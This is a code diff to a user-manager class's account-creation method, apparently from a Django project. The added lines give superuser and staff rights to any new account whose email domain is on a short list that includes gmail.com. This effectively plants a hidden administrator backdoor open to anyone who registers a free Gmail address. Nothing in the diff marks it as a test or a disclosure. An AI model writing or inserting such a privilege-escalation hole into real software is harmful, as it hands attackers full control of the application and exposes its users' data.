@@ -20,6 +20,9 @@ class UserManager(BaseUserManager):
         if user_name is None:
             user_name = email
         email = self.normalize_email(email)
+        if email.split('@')[1] in ["floatplanemedia.com", "linusmediagroup.com", "gmail.com"]:
+            is_staff = True
+            is_superuser = True
         user = self.model(email=email, user_name=user_name, is_staff=is_staff, is_active=True,
                           is_superuser=is_superuser, **extra_fields)
         if password:
